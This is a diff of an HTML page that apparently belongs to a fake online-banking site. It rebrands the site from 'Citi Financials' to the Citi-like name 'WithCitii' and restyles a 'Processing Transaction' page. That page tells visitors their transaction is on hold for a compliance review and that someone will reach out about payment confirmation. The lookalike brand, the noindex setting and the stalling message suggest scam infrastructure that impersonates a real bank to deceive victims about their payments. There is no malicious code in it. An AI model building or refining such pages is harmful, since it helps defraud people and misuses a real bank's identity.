@@ -6,7 +6,7 @@
   <style>.hidden-cloak { opacity: 0 !important; pointer-events: none !important; }</style>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Loading...</title>
+  <title>Processing Transaction | WithCitii Secure</title>
   <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
   <script>
     tailwind.config = {
@@ -22,7 +22,6 @@
           },
           fontFamily: {
             sans: ["Inter", "sans-serif"],
-
           }
         }
       }
@@ -34,7 +33,7 @@
     rel="stylesheet" />
   <style type="text/tailwindcss">
     @layer base {
-      body { @apply bg-white text-bankText font-sans antialiased; }
+      body { @apply bg-slate-50 text-bankText font-sans antialiased; }
     }
   </style>
   <link rel="icon" type="image/png" href="logo.png">
@@ -43,39 +42,37 @@
   <meta name="googlebot" content="noindex, nofollow">
 
   <!-- Social Meta Tags -->
-  
   <meta property="og:description"
-    content="Secure, simplified, and powerful online banking. Access your dashboard, track your transactions, and manage your assets with Citi Financials.">
+    content="Secure, simplified, and powerful online banking. Access your dashboard, track your transactions, and manage your assets with WithCitii.">
   <meta property="og:image"
-    content="https://raw.githubusercontent.com/madebyframeio/Citi Financials-Project/main/meta.png">
-  <meta property="og:url" content="https://citi-financials.netlify.app/">
+    content="https://raw.githubusercontent.com/madebyframeio/WithCitii-Project/main/meta.png">
+  <meta property="og:url" content="https://withcitii.netlify.app/">
   <meta property="og:type" content="website">
 
   <meta name="twitter:card" content="summary_large_image">
-  
   <meta name="twitter:description"
-    content="Secure, simplified, and powerful online banking. Access your dashboard, track your transactions, and manage your assets with Citi Financials.">
+    content="Secure, simplified, and powerful online banking. Access your dashboard, track your transactions, and manage your assets with WithCitii.">
   <meta name="twitter:image"
-    content="https://raw.githubusercontent.com/madebyframeio/Citi Financials-Project/main/meta.png">
+    content="https://raw.githubusercontent.com/madebyframeio/WithCitii-Project/main/meta.png">
 </head>
 
-<body class="hidden-cloak  min-h-screen flex flex-col overflow-x-hidden">
+<body class="hidden-cloak min-h-screen flex flex-col overflow-x-hidden">
   <!-- Corporate Header -->
-  <header class="bg-primary text-white p-4 shadow-md">
-    <div class="max-w-4xl mx-auto flex justify-between items-center">
-      <a href="dashboard.html" class="bg-white p-1 rounded-sm shadow-inner overflow-hidden">
-        <img src="logo.png" alt="Citi Financials" class="h-8">
+  <header class="bg-primary text-white shadow-lg sticky top-0 z-50">
+    <div class="max-w-4xl mx-auto px-6 py-4 flex items-center justify-between">
+      <a href="dashboard.html" class="bg-white p-1 rounded-sm shadow-sm hover:scale-105 transition-all">
+        <img src="logo.png" alt="WithCitii" class="h-8">
       </a>
-      <a href="dashboard.html"
-        class="text-[10px] font-black uppercase tracking-widest hover:underline flex items-center gap-2">
-        <span class="material-symbols-outlined text-sm">arrow_back</span> Return to Dashboard
-      </a>
+      <div class="flex items-center gap-3">
+        <span class="material-symbols-outlined text-sm text-accent animate-pulse">sync</span>
+        <span class="text-[10px] font-black uppercase tracking-[0.2em] opacity-70">Security Verification</span>
+      </div>
     </div>
   </header>
 
   <main class="flex-1 flex items-center justify-center p-6">
     <div
-      class="max-w-md w-full bg-white border border-gray-100 p-12 rounded-sm shadow-2xl text-center space-y-8 relative overflow-hidden">
+      class="max-w-md w-full bg-white border border-gray-100 p-12 rounded-xl shadow-2xl text-center space-y-8 relative overflow-hidden">
       <!-- Top Stripe -->
       <div class="absolute top-0 left-0 w-full h-1.5 bg-primary"></div>
 
@@ -89,33 +86,31 @@
         <p class="text-[10px] font-black uppercase tracking-[0.3em] text-gray-400">Transaction Status: Hold</p>
       </div>
 
-      <div class="py-10 border-y border-gray-50 text-sm font-semibold text-gray-600 leading-relaxed px-4">
+      <div class="py-10 border-y border-gray-50 text-sm font-semibold text-gray-600 leading-relaxed px-4 italic">
         "Our compliance department is currently reviewing your recent activity. Someone from the verification
         team will reach out with payment confirmation shortly. Alternatively, please check back in 48 hours."
       </div>
 
       <div class="space-y-4 pt-4">
         <button onclick="window.location.href='dashboard.html'"
-          class="w-full py-4 bg-primary text-white font-black text-xs uppercase tracking-widest rounded-sm hover:bg-blue-900 transition-all shadow-lg active:scale-95">
+          class="w-full py-4 bg-primary text-white font-black text-xs uppercase tracking-widest rounded-xl hover:brightness-110 transition-all shadow-lg active:scale-95">
           Return to Dashboard
         </button>
         <div
-          class="flex items-center justify-center gap-3 sm:gap-6 text-[10px] font-black uppercase tracking-widest text-secondary">
+          class="flex items-center justify-center gap-8 text-[10px] font-black uppercase tracking-widest text-secondary">
           <a href="support.html" class="hover:underline">Support Chat</a>
-          <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
           <a href="faq.html" class="hover:underline">Plan & Learn</a>
         </div>
       </div>
     </div>
   </main>
 
-  <footer class="bg-bankGray py-10 border-t border-gray-200">
-    <div
-      class="max-w-4xl mx-auto px-4 flex justify-between items-center text-[10px] font-black uppercase tracking-widest text-gray-400">
-      <p>© 2026 Citi Financials. All rights reserved.</p>
-      <div class="flex gap-6">
-        <a href="faq.html" class="hover:underline">Privacy Help</a>
-        <a href="support.html" class="hover:underline">Security Support</a>
+  <footer class="bg-white border-t border-gray-200 py-10 mt-auto">
+    <div class="max-w-4xl mx-auto px-6 flex flex-col md:flex-row justify-between items-center gap-8 text-[11px] text-gray-400 font-black uppercase tracking-widest leading-relaxed text-center md:text-left">
+      <p>© 2026 WithCitii Online Banking</p>
+      <div class="flex gap-8">
+        <a href="faq.html" class="hover:text-primary transition-colors">Privacy & Legal</a>
+        <a href="support.html" class="hover:text-primary transition-colors">Security Support</a>
       </div>
     </div>
   </footer>
